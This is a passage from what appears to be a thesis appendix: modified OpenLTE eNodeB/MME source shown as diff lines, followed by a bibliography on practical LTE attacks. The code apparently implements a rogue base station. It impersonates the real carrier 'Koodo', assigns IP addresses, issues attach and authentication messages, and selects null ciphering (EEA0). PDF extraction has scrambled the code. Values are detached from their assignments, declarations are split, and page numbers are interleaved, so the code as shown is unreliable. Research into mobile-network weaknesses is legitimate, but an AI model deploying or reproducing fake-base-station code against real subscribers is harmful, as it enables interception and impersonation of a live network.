+= 9;
+
+= "sp.koodo.com";
+
+}
+act_def_eps_bearer_context_req.eps_qos.qci
+act_def_eps_bearer_context_req.eps_qos.br_present = false;
+act_def_eps_bearer_context_req.eps_qos.br_ext_present = false;
+act_def_eps_bearer_context_req.apn.apn
+act_def_eps_bearer_context_req.pdn_addr.pdn_type = LIBLTE_MME_PDN_TYPE_IPV4;
+act_def_eps_bearer_context_req.pdn_addr.addr[0] = (ip_addr >> 24) & 0xFF;
+act_def_eps_bearer_context_req.pdn_addr.addr[1] = (ip_addr >> 16) & 0xFF;
+act_def_eps_bearer_context_req.pdn_addr.addr[2] = (ip_addr >> 8) & 0xFF;
+act_def_eps_bearer_context_req.pdn_addr.addr[3] = ip_addr & 0xFF;
+act_def_eps_bearer_context_req.transaction_id_present = false;
+act_def_eps_bearer_context_req.negotiated_qos_present = false;
+act_def_eps_bearer_context_req.llc_sapi_present = false;
+act_def_eps_bearer_context_req.radio_prio_present = false;
+act_def_eps_bearer_context_req.packet_flow_id_present = false;
+act_def_eps_bearer_context_req.apn_ambr_present = false;
+if(LIBLTE_MME_PDN_TYPE_IPV4 == user->get_pdn_type())
+{
+
+act_def_eps_bearer_context_req.esm_cause_present = false;
+
+}else{
+
+act_def_eps_bearer_context_req.esm_cause_present = true;
+act_def_eps_bearer_context_req.esm_cause
+
+=
+
+LIBLTE_MME_ESM_CAUSE_PDN_TYPE_IPV4_ONLY_ALLOWED;
+
+}
+if(0 != pco->N_opts)
+{
+
+act_def_eps_bearer_context_req.protocol_cnfg_opts_present = true;
+memcpy(&act_def_eps_bearer_context_req.protocol_cnfg_opts, pco, sizeof(
+
+LIBLTE_MME_PROTOCOL_CONFIG_OPTIONS_STRUCT));
+
+}else{
+
+act_def_eps_bearer_context_req.protocol_cnfg_opts_present = false;
+
+}
+act_def_eps_bearer_context_req.connectivity_type_present = false;
+liblte_mme_pack_activate_default_eps_bearer_context_request_msg(&
+
+act_def_eps_bearer_context_req,
+
+&attach_accept.esm_msg);
+
+sem_wait(&sys_info_sem);
+attach_accept.eps_attach_result
+
+= user->get_attach_type();
+
+74
+
+attach_accept.t3412.unit
+attach_accept.tai_list.N_tais
+attach_accept.tai_list.tai[0].mcc
+attach_accept.tai_list.tai[0].mnc
+attach_accept.tai_list.tai[0].tac
+attach_accept.guti_present
+attach_accept.guti.type_of_id
+attach_accept.guti.guti.mcc
+attach_accept.guti.guti.mnc
+attach_accept.guti.guti.mme_group_id
+attach_accept.guti.guti.mme_code
+attach_accept.guti.guti.m_tmsi
+attach_accept.lai_present
+attach_accept.ms_id_present
+attach_accept.emm_cause_present
+attach_accept.t3402_present
+attach_accept.t3423_present
+attach_accept.equivalent_plmns_present
+attach_accept.emerg_num_list_present
+attach_accept.eps_network_feature_support_present = false;
+attach_accept.additional_update_result_present = false;
+attach_accept.t3412_ext_present
+sem_post(&sys_info_sem);
+user->set_guti(&attach_accept.guti.guti);
+liblte_mme_pack_attach_accept_msg(&attach_accept,
+
+= LIBLTE_MME_GPRS_TIMER_DEACTIVATED;
+= 1;
+= sys_info.mcc;
+= sys_info.mnc;
+= sys_info.sib1.tracking_area_code;
+= true;
+= LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI;
+= sys_info.mcc;
+= sys_info.mnc;
+= 0;
+= 0;
+= user_mgr->get_next_m_tmsi();
+= false;
+= false;
+= false;
+= false;
+= false;
+= false;
+= false;
+
+= false;
+
+LIBLTE_MME_SECURITY_HDR_TYPE_INTEGRITY_AND_CIPHERED,
+user->get_auth_vec()->k_nas_int,
+user->get_auth_vec()->nas_count_dl,
+LIBLTE_SECURITY_DIRECTION_DOWNLINK,
+&msg);
+
+user->increment_nas_count_dl();
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+&msg,
+"Sending Attach Accept for RNTI=%u, RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Queue the NAS message for RRC
+rb->queue_rrc_nas_msg(&msg);
+
+// Signal RRC for NAS message
+cmd_ready.user = user;
+cmd_ready.rb = rb;
+cmd_ready.cmd = LTE_FDD_ENB_RRC_CMD_SETUP_DEF_DRB;
+msgq_to_rrc->send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_CMD_READY,
+
+LTE_FDD_ENB_DEST_LAYER_RRC,
+(LTE_FDD_ENB_MESSAGE_UNION *)&cmd_ready,
+sizeof(LTE_FDD_ENB_RRC_CMD_READY_MSG_STRUCT));
+
+75
+
+}
+void LTE_fdd_enb_mme::send_attach_reject(LTE_fdd_enb_user *user,
+
+LTE_fdd_enb_rb *rb)
+
+{
+
+LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT nas_msg_ready;
+LIBLTE_MME_ATTACH_REJECT_MSG_STRUCT attach_rej;
+LIBLTE_BYTE_MSG_STRUCT
+uint64
+
+msg;
+imsi_num;
+
+if(user->is_id_set())
+{
+
+imsi_num = user->get_id()->imsi;
+
+}else{
+
+imsi_num = user->get_temp_id();
+
+}
+
+attach_rej.emm_cause
+attach_rej.esm_msg_present = false;
+attach_rej.t3446_value_present = false;
+liblte_mme_pack_attach_reject_msg(&attach_rej, &msg);
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+= user->get_emm_cause();
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+&msg,
+"Sending Attach Reject for IMSI=%015llu, RNTI=%u, RB=%s",
+imsi_num,
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Queue the NAS message for RRC
+rb->queue_rrc_nas_msg(&msg);
+
+// Signal RRC for NAS message
+nas_msg_ready.user = user;
+nas_msg_ready.rb = rb;
+msgq_to_rrc->send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_NAS_MSG_READY,
+
+LTE_FDD_ENB_DEST_LAYER_RRC,
+(LTE_FDD_ENB_MESSAGE_UNION *)&nas_msg_ready,
+sizeof(LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT));
+
+send_rrc_command(user, rb, LTE_FDD_ENB_RRC_CMD_RELEASE);
+
+}
+void LTE_fdd_enb_mme::send_authentication_reject(LTE_fdd_enb_user *user,
+
+LTE_fdd_enb_rb *rb)
+
+{
+
+LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT nas_msg_ready;
+LIBLTE_MME_AUTHENTICATION_REJECT_MSG_STRUCT auth_rej;
+LIBLTE_BYTE_MSG_STRUCT
+
+msg;
+
+liblte_mme_pack_authentication_reject_msg(&auth_rej, &msg);
+
+76
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+&msg,
+"Sending Authentication Reject for RNTI=%u, RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Queue the NAS message for RRC
+rb->queue_rrc_nas_msg(&msg);
+
+// Signal RRC for NAS message
+nas_msg_ready.user = user;
+nas_msg_ready.rb = rb;
+msgq_to_rrc->send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_NAS_MSG_READY,
+
+LTE_FDD_ENB_DEST_LAYER_RRC,
+(LTE_FDD_ENB_MESSAGE_UNION *)&nas_msg_ready,
+sizeof(LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT));
+
+send_rrc_command(user, rb, LTE_FDD_ENB_RRC_CMD_RELEASE);
+
+}
+void LTE_fdd_enb_mme::send_authentication_request(LTE_fdd_enb_user *user,
+
+LTE_fdd_enb_rb *rb)
+
+{
+
+LTE_fdd_enb_hss
+LTE_FDD_ENB_AUTHENTICATION_VECTOR_STRUCT *auth_vec = NULL;
+LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT nas_msg_ready;
+LIBLTE_MME_AUTHENTICATION_REQUEST_MSG_STRUCT auth_req;
+LIBLTE_BYTE_MSG_STRUCT
+uint32
+
+msg;
+i;
+
+*hss
+
+= LTE_fdd_enb_hss::get_instance();
+
+sem_wait(&sys_info_sem);
+hss->generate_security_data(user->get_id(), sys_info.mcc, sys_info.mnc);
+sem_post(&sys_info_sem);
+auth_vec = hss->get_auth_vec(user->get_id());
+if(NULL != auth_vec)
+{
+
+for(i=0; i<16; i++)
+{
+
+auth_req.autn[i] = auth_vec->autn[i];
+auth_req.rand[i] = auth_vec->rand[i];
+
+}
+auth_req.nas_ksi.tsc_flag = LIBLTE_MME_TYPE_OF_SECURITY_CONTEXT_FLAG_NATIVE;
+auth_req.nas_ksi.nas_ksi = 0;
+liblte_mme_pack_authentication_request_msg(&auth_req, &msg);
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+&msg,
+
+77
+
+"Sending Authentication Request for RNTI=%u, RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Queue the NAS message for RRC
+rb->queue_rrc_nas_msg(&msg);
+
+// Signal RRC
+nas_msg_ready.user = user;
+nas_msg_ready.rb = rb;
+msgq_to_rrc->send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_NAS_MSG_READY,
+
+LTE_FDD_ENB_DEST_LAYER_RRC,
+(LTE_FDD_ENB_MESSAGE_UNION *)&nas_msg_ready,
+sizeof(LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT));
+
+}
+
+}
+void LTE_fdd_enb_mme::send_detach_accept(LTE_fdd_enb_user *user,
+
+LTE_fdd_enb_rb *rb)
+
+{
+
+LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT nas_msg_ready;
+LIBLTE_MME_DETACH_ACCEPT_MSG_STRUCT detach_accept;
+LIBLTE_BYTE_MSG_STRUCT
+
+msg;
+
+if(user->is_auth_vec_set())
+{
+
+liblte_mme_pack_detach_accept_msg(&detach_accept,
+
+LIBLTE_MME_SECURITY_HDR_TYPE_INTEGRITY_AND_CIPHERED
+
+,
+
+user->get_auth_vec()->k_nas_int,
+user->get_auth_vec()->nas_count_dl,
+LIBLTE_SECURITY_DIRECTION_DOWNLINK,
+&msg);
+
+user->increment_nas_count_dl();
+
+}else{
+
+liblte_mme_pack_detach_accept_msg(&detach_accept,
+
+LIBLTE_MME_SECURITY_HDR_TYPE_PLAIN_NAS,
+NULL,
+0,
+0,
+&msg);
+
+}
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+&msg,
+"Sending Detach Accept for RNTI=%u, RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Queue the NAS message for RRC
+
+78
+
+rb->queue_rrc_nas_msg(&msg);
+
+// Signal RRC
+nas_msg_ready.user = user;
+nas_msg_ready.rb = rb;
+msgq_to_rrc->send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_NAS_MSG_READY,
+
+LTE_FDD_ENB_DEST_LAYER_RRC,
+(LTE_FDD_ENB_MESSAGE_UNION *)&nas_msg_ready,
+sizeof(LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT));
+
+}
+void LTE_fdd_enb_mme::send_emm_information(LTE_fdd_enb_user *user,
+
+LTE_fdd_enb_rb *rb)
+
+{
+
+LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT nas_msg_ready;
+LIBLTE_MME_EMM_INFORMATION_MSG_STRUCT emm_info;
+LIBLTE_BYTE_MSG_STRUCT
+struct tm
+time_t
+
+*local_time;
+
+msg;
+
+tmp_time;
+
+tmp_time = time(NULL);
+local_time = localtime(&tmp_time);
+
+= true;
+= "Koodo";
+= LIBLTE_MME_ADD_CI_DONT_ADD;
+= true;
+= "oLTE";
+= LIBLTE_MME_ADD_CI_DONT_ADD;
+= false;
+
+emm_info.full_net_name_present
+emm_info.full_net_name.name
+emm_info.full_net_name.add_ci
+emm_info.short_net_name_present
+emm_info.short_net_name.name
+emm_info.short_net_name.add_ci
+emm_info.local_time_zone_present
+emm_info.utc_and_local_time_zone_present = true;
+emm_info.utc_and_local_time_zone.year = local_time->tm_year;
+emm_info.utc_and_local_time_zone.month = local_time->tm_mon + 1;
+emm_info.utc_and_local_time_zone.day = local_time->tm_mday;
+emm_info.utc_and_local_time_zone.hour = local_time->tm_hour;
+emm_info.utc_and_local_time_zone.minute = local_time->tm_min;
+emm_info.utc_and_local_time_zone.second = local_time->tm_sec;
+emm_info.utc_and_local_time_zone.tz = 0; // FIXME
+emm_info.net_dst_present
+liblte_mme_pack_emm_information_msg(&emm_info,
+
+= false;
+
+LIBLTE_MME_SECURITY_HDR_TYPE_INTEGRITY_AND_CIPHERED,
+user->get_auth_vec()->k_nas_int,
+user->get_auth_vec()->nas_count_dl,
+LIBLTE_SECURITY_DIRECTION_DOWNLINK,
+&msg);
+
+user->increment_nas_count_dl();
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+&msg,
+"Sending EMM Information for RNTI=%u, RB=%s",
+
+79
+
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Queue the NAS message for RRC
+rb->queue_rrc_nas_msg(&msg);
+
+// Signal RRC
+nas_msg_ready.user = user;
+nas_msg_ready.rb = rb;
+msgq_to_rrc->send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_NAS_MSG_READY,
+
+LTE_FDD_ENB_DEST_LAYER_RRC,
+(LTE_FDD_ENB_MESSAGE_UNION *)&nas_msg_ready,
+sizeof(LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT));
+
+}
+void LTE_fdd_enb_mme::send_identity_request(LTE_fdd_enb_user *user,
+
+LTE_fdd_enb_rb *rb,
+uint8
+
+id_type)
+
+{
+
+LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT nas_msg_ready;
+LIBLTE_MME_ID_REQUEST_MSG_STRUCT
+LIBLTE_BYTE_MSG_STRUCT
+
+id_req;
+msg;
+
+id_req.id_type = id_type;
+liblte_mme_pack_identity_request_msg(&id_req, &msg);
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+&msg,
+"Sending ID Request for RNTI=%u, RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Queue the NAS message for RRC
+rb->queue_rrc_nas_msg(&msg);
+
+// Signal RRC
+nas_msg_ready.user = user;
+nas_msg_ready.rb = rb;
+msgq_to_rrc->send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_NAS_MSG_READY,
+
+LTE_FDD_ENB_DEST_LAYER_RRC,
+(LTE_FDD_ENB_MESSAGE_UNION *)&nas_msg_ready,
+sizeof(LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT));
+
+}
+void LTE_fdd_enb_mme::send_security_mode_command(LTE_fdd_enb_user *user,
+
+LTE_fdd_enb_rb *rb)
+
+{
+
+LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT nas_msg_ready;
+LIBLTE_MME_SECURITY_MODE_COMMAND_MSG_STRUCT sec_mode_cmd;
+LIBLTE_BYTE_MSG_STRUCT
+uint32
+
+msg;
+i;
+
+80
+
+sec_mode_cmd.selected_nas_sec_algs.type_of_eea =
+LIBLTE_MME_TYPE_OF_CIPHERING_ALGORITHM_EEA0;
+sec_mode_cmd.selected_nas_sec_algs.type_of_eia =
+
+LIBLTE_MME_TYPE_OF_INTEGRITY_ALGORITHM_128_EIA2;
+
+sec_mode_cmd.nas_ksi.tsc_flag
+
+=
+
+LIBLTE_MME_TYPE_OF_SECURITY_CONTEXT_FLAG_NATIVE;
+
+sec_mode_cmd.nas_ksi.nas_ksi
+for(i=0; i<8; i++)
+{
+
+= 0;
+
+sec_mode_cmd.ue_security_cap.eea[i] = user->get_eea_support(i);
+sec_mode_cmd.ue_security_cap.eia[i] = user->get_eia_support(i);
+sec_mode_cmd.ue_security_cap.uea[i] = user->get_uea_support(i);
+sec_mode_cmd.ue_security_cap.uia[i] = user->get_uia_support(i);
+sec_mode_cmd.ue_security_cap.gea[i] = user->get_gea_support(i);
+
+}
+if(user->is_uea_set())
+{
+
+sec_mode_cmd.ue_security_cap.uea_present = true;
+
+}else{
+
+sec_mode_cmd.ue_security_cap.uea_present = false;
+
+}
+if(user->is_uia_set())
+{
+
+sec_mode_cmd.ue_security_cap.uia_present = true;
+
+}else{
+
+sec_mode_cmd.ue_security_cap.uia_present = false;
+
+}
+if(user->is_gea_set())
+{
+
+sec_mode_cmd.ue_security_cap.gea_present = true;
+
+}else{
+
+sec_mode_cmd.ue_security_cap.gea_present = false;
+
+}
+sec_mode_cmd.imeisv_req
+sec_mode_cmd.imeisv_req_present = true;
+sec_mode_cmd.nonce_ue_present = false;
+sec_mode_cmd.nonce_mme_present = false;
+liblte_mme_pack_security_mode_command_msg(&sec_mode_cmd,
+
+= LIBLTE_MME_IMEISV_REQUESTED;
+
+LIBLTE_MME_SECURITY_HDR_TYPE_INTEGRITY_WITH_NEW_EPS_SECURITY_CONTEXT
+
+,
+
+user->get_auth_vec()->k_nas_int,
+user->get_auth_vec()->nas_count_dl,
+LIBLTE_SECURITY_DIRECTION_DOWNLINK,
+&msg);
+
+user->increment_nas_count_dl();
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+&msg,
+
+81
+
+"Sending Security Mode Command for RNTI=%u, RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Queue the message for RRC
+rb->queue_rrc_nas_msg(&msg);
+
+// Signal RRC
+nas_msg_ready.user = user;
+nas_msg_ready.rb = rb;
+msgq_to_rrc->send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_NAS_MSG_READY,
+
+LTE_FDD_ENB_DEST_LAYER_RRC,
+(LTE_FDD_ENB_MESSAGE_UNION *)&nas_msg_ready,
+sizeof(LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT));
+
+}
+void LTE_fdd_enb_mme::send_service_reject(LTE_fdd_enb_user *user,
+
+LTE_fdd_enb_rb *rb,
+uint8
+
+cause)
+
+{
+
+}
+
+LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT nas_msg_ready;
+LIBLTE_MME_SERVICE_REJECT_MSG_STRUCT service_rej;
+LIBLTE_BYTE_MSG_STRUCT
+
+msg;
+
+service_rej.emm_cause
+service_rej.t3442_present = false;
+service_rej.t3446_present = false;
+liblte_mme_pack_service_reject_msg(&service_rej,
+
+= cause;
+
+LIBLTE_MME_SECURITY_HDR_TYPE_PLAIN_NAS,
+NULL,
+0,
+0,
+&msg);
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+&msg,
+"Sending Service Reject for RNTI=%u, RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Queue the NAS message for RRC
+rb->queue_rrc_nas_msg(&msg);
+
+nas_msg_ready.user = user;
+nas_msg_ready.rb = rb;
+msgq_to_rrc->send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_NAS_MSG_READY,
+
+LTE_FDD_ENB_DEST_LAYER_RRC,
+(LTE_FDD_ENB_MESSAGE_UNION *)&nas_msg_ready,
+sizeof(LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT));
+
+82
+
+void LTE_fdd_enb_mme::send_activate_dedicated_eps_bearer_context_request(LTE_fdd_enb_user
+
+*user,
+
+{
+
+LTE_fdd_enb_rb *rb)
+
+LTE_FDD_ENB_RRC_CMD_READY_MSG_STRUCT
+LIBLTE_MME_ACTIVATE_DEDICATED_EPS_BEARER_CONTEXT_REQUEST_MSG_STRUCT
+
+cmd_ready;
+
+act_ded_eps_bearer_context_req;
+
+LIBLTE_BYTE_MSG_STRUCT
+LIBLTE_BYTE_MSG_STRUCT
+
+if(0 == user->get_eps_bearer_id())
+{
+
+msg;
+sec_msg;
+
+act_ded_eps_bearer_context_req.eps_bearer_id = 6;
+user->set_eps_bearer_id(5);
+
+}else{
+
+act_ded_eps_bearer_context_req.eps_bearer_id = user->get_eps_bearer_id()+1;
+
+}
+act_ded_eps_bearer_context_req.proc_transaction_id
+act_ded_eps_bearer_context_req.linked_eps_bearer_id
+
+get_eps_bearer_id();
+
+act_ded_eps_bearer_context_req.eps_qos.qci
+act_ded_eps_bearer_context_req.eps_qos.br_present
+act_ded_eps_bearer_context_req.eps_qos.br_ext_present
+act_ded_eps_bearer_context_req.tft.tft_op_code
+
+LIBLTE_MME_TFT_OPERATION_CODE_CREATE_NEW_TFT;
+
+act_ded_eps_bearer_context_req.tft.parameter_list_size
+act_ded_eps_bearer_context_req.tft.packet_filter_list_size
+act_ded_eps_bearer_context_req.tft.packet_filter_list[0].id
+act_ded_eps_bearer_context_req.tft.packet_filter_list[0].dir
+
+LIBLTE_MME_TFT_PACKET_FILTER_DIRECTION_BIDIRECTIONAL;
+
+= 0;
+= user->
+
+= 9;
+= false;
+= false;
+=
+
+= 0;
+= 3;
+= 1;
+=
+
+act_ded_eps_bearer_context_req.tft.packet_filter_list[0].eval_precedence = 1;
+act_ded_eps_bearer_context_req.tft.packet_filter_list[0].filter_size = 2;
+act_ded_eps_bearer_context_req.tft.packet_filter_list[0].filter[0] =
+
+LIBLTE_MME_TFT_PACKET_FILTER_COMPONENT_TYPE_ID_PROTOCOL_ID_NEXT_HEADER_TYPE;
+
+act_ded_eps_bearer_context_req.tft.packet_filter_list[0].filter[1] = IPPROTO_UDP;
+act_ded_eps_bearer_context_req.tft.packet_filter_list[1].id
+act_ded_eps_bearer_context_req.tft.packet_filter_list[1].dir
+
+= 2;
+=
+
+LIBLTE_MME_TFT_PACKET_FILTER_DIRECTION_BIDIRECTIONAL;
+
+act_ded_eps_bearer_context_req.tft.packet_filter_list[1].eval_precedence = 2;
+act_ded_eps_bearer_context_req.tft.packet_filter_list[1].filter_size = 2;
+act_ded_eps_bearer_context_req.tft.packet_filter_list[1].filter[0] =
+
+LIBLTE_MME_TFT_PACKET_FILTER_COMPONENT_TYPE_ID_PROTOCOL_ID_NEXT_HEADER_TYPE;
+
+act_ded_eps_bearer_context_req.tft.packet_filter_list[1].filter[1] = IPPROTO_TCP;
+act_ded_eps_bearer_context_req.tft.packet_filter_list[2].id
+act_ded_eps_bearer_context_req.tft.packet_filter_list[2].dir
+
+= 3;
+=
+
+LIBLTE_MME_TFT_PACKET_FILTER_DIRECTION_BIDIRECTIONAL;
+
+act_ded_eps_bearer_context_req.tft.packet_filter_list[2].eval_precedence = 3;
+act_ded_eps_bearer_context_req.tft.packet_filter_list[2].filter_size = 2;
+act_ded_eps_bearer_context_req.tft.packet_filter_list[2].filter[0] =
+
+LIBLTE_MME_TFT_PACKET_FILTER_COMPONENT_TYPE_ID_PROTOCOL_ID_NEXT_HEADER_TYPE;
+
+act_ded_eps_bearer_context_req.tft.packet_filter_list[2].filter[1] = IPPROTO_ICMP;
+
+83
+
+act_ded_eps_bearer_context_req.transaction_id_present
+act_ded_eps_bearer_context_req.negotiated_qos_present
+act_ded_eps_bearer_context_req.llc_sapi_present
+act_ded_eps_bearer_context_req.radio_prio_present
+act_ded_eps_bearer_context_req.packet_flow_id_present
+act_ded_eps_bearer_context_req.protocol_cnfg_opts_present
+liblte_mme_pack_activate_dedicated_eps_bearer_context_request_msg(&
+
+= false;
+= false;
+= false;
+= false;
+= false;
+= false;
+
+act_ded_eps_bearer_context_req,
+
+&msg);
+
+liblte_mme_pack_security_protected_nas_msg(&msg,
+
+LIBLTE_MME_SECURITY_HDR_TYPE_INTEGRITY_AND_CIPHERED
+
+,
+
+user->get_auth_vec()->k_nas_int,
+user->get_auth_vec()->nas_count_dl,
+LIBLTE_SECURITY_DIRECTION_DOWNLINK,
+&sec_msg);
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+&sec_msg,
+"Sending Activate Dedicated EPS Bearer Context Request for
+
+RNTI=%u, RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Queue the NAS message for RRC
+rb->queue_rrc_nas_msg(&sec_msg);
+
+// Signal RRC for NAS message
+cmd_ready.user = user;
+cmd_ready.rb = rb;
+cmd_ready.cmd = LTE_FDD_ENB_RRC_CMD_SETUP_DED_DRB;
+msgq_to_rrc->send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_CMD_READY,
+
+LTE_FDD_ENB_DEST_LAYER_RRC,
+(LTE_FDD_ENB_MESSAGE_UNION *)&cmd_ready,
+sizeof(LTE_FDD_ENB_RRC_CMD_READY_MSG_STRUCT));
+
+}
+void LTE_fdd_enb_mme::send_esm_information_request(LTE_fdd_enb_user *user,
+
+LTE_fdd_enb_rb *rb)
+
+{
+
+LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT nas_msg_ready;
+LIBLTE_MME_ESM_INFORMATION_REQUEST_MSG_STRUCT esm_info_req;
+LIBLTE_BYTE_MSG_STRUCT
+LIBLTE_BYTE_MSG_STRUCT
+
+msg;
+sec_msg;
+
+esm_info_req.eps_bearer_id = 0;
+if(0 == user->get_proc_transaction_id())
+{
+
+esm_info_req.proc_transaction_id = 1;
+user->set_proc_transaction_id(1);
+
+84
+
+}else{
+
+esm_info_req.proc_transaction_id = user->get_proc_transaction_id();
+
+}
+liblte_mme_pack_esm_information_request_msg(&esm_info_req, &msg);
+liblte_mme_pack_security_protected_nas_msg(&msg,
+
+LIBLTE_MME_SECURITY_HDR_TYPE_INTEGRITY_AND_CIPHERED
+
+,
+
+user->get_auth_vec()->k_nas_int,
+user->get_auth_vec()->nas_count_dl,
+LIBLTE_SECURITY_DIRECTION_DOWNLINK,
+&sec_msg);
+
+interface->send_debug_msg(LTE_FDD_ENB_DEBUG_TYPE_INFO,
+
+LTE_FDD_ENB_DEBUG_LEVEL_MME,
+__FILE__,
+__LINE__,
+&sec_msg,
+"Sending ESM Info Request for RNTI=%u, RB=%s",
+user->get_c_rnti(),
+LTE_fdd_enb_rb_text[rb->get_rb_id()]);
+
+// Queue the NAS message for RRC
+rb->queue_rrc_nas_msg(&sec_msg);
+
+// Signal RRC
+nas_msg_ready.user = user;
+nas_msg_ready.rb = rb;
+msgq_to_rrc->send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_NAS_MSG_READY,
+
+LTE_FDD_ENB_DEST_LAYER_RRC,
+(LTE_FDD_ENB_MESSAGE_UNION *)&nas_msg_ready,
+sizeof(LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT));
+
+}
+void LTE_fdd_enb_mme::send_rrc_command(LTE_fdd_enb_user
+
+LTE_fdd_enb_rb
+LTE_FDD_ENB_RRC_CMD_ENUM cmd)
+
+*user,
+*rb,
+
+{
+
+}
+
+LTE_FDD_ENB_RRC_CMD_READY_MSG_STRUCT cmd_ready;
+
+// Signal RRC for command
+cmd_ready.user = user;
+cmd_ready.rb = rb;
+cmd_ready.cmd = cmd;
+msgq_to_rrc->send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_CMD_READY,
+
+LTE_FDD_ENB_DEST_LAYER_RRC,
+(LTE_FDD_ENB_MESSAGE_UNION *)&cmd_ready,
+sizeof(LTE_FDD_ENB_RRC_CMD_READY_MSG_STRUCT));
+
+Helpers
+
+/*****************/
+/*
+/*****************/
+uint32 LTE_fdd_enb_mme::get_next_ip_addr(void)
+
+*/
+
+85
+
+{
+
+}
+
+uint32 ip_addr = next_ip_addr;
+
+next_ip_addr++;
+if((next_ip_addr & 0xFF) == 0xFF)
+{
+
+next_ip_addr++;
+
+}
+
+return(ip_addr);
+
+86
+
+Bibliography
+
+[1] A. Shaik, R. Borgaonkar, N. Asokan, V. Niemi, and J.-P. Seifert, Practical attacks
+against privacy and availability in 4g/lte mobile communication systems, arXiv preprint
+arXiv:1510.07563, 2015.
+
+[2] R. P. Jover, J. Lackey, and A. Raghavan, Enhancing the security of lte networks against
+
+jamming attacks, EURASIP Journal on Information Security, vol. 2014, no. 1, p. 7, 2014.
+
+[3] D. Perez and J. Pico, A practical attack against gprs/edge/umts/hspa mobile data communi-
+
+cations, Black Hat DC, 2011.
+
+87
+
+
